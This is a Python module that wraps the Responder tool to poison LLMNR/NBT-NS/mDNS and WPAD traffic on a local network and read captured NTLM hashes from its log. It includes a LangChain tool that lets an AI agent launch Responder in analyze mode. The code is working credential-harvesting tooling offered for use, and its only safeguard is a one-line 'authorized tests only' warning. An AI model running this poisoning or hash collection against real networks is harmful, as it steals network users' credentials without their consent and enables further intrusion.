"""Responder Integration - LLMNR/NBT-NS/mDNS Poisoning"""

import logging
import signal
import subprocess

logger = logging.getLogger(__name__)


class ResponderPoisoner:
    """Network Credential Harvesting via Poisoning"""

    def __init__(self, responder_path: str = "responder"):
        self.responder_path = responder_path
        self.process = None

    def start_poisoning(self, interface: str = "eth0", analyze: bool = False) -> str:
        """
        Startet Responder Poisoning.

        WARNUNG: Nur für autorisierte Tests!
        """
        cmd = [
            self.responder_path,
            "-I",
            interface,
            "-w",  # WPAD poison
        ]

        if analyze:
            cmd.append("-A")  # Analyze mode only
        else:
            cmd.extend(["-r", "-f", "-v"])  # Full poison mode

        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return f"Responder started on {interface}"
        except Exception as e:
            return f"Error: {str(e)}"

    def stop_poisoning(self) -> str:
        """Stoppt Responder"""
        if self.process:
            self.process.send_signal(signal.SIGTERM)
            self.process = None
            return "Responder stopped"
        return "Responder not running"

    def get_captured_hashes(self) -> str:
        """Holt gesammelte NTLM-Hashes"""
        log_dir = "/usr/share/responder/logs"
        try:
            with open(f"{log_dir}/Responder-Session.log", "r") as f:
                return f.read()[-5000:]  # Letzte 5000 Zeichen
        except Exception:
            return "No logs found"


from langchain_core.tools import tool


@tool
def responder_analyze(interface: str = "eth0") -> str:
    """Analyze mode (passive) für Responder"""
    responder = ResponderPoisoner()
    result = responder.start_poisoning(interface, analyze=True)
    return result
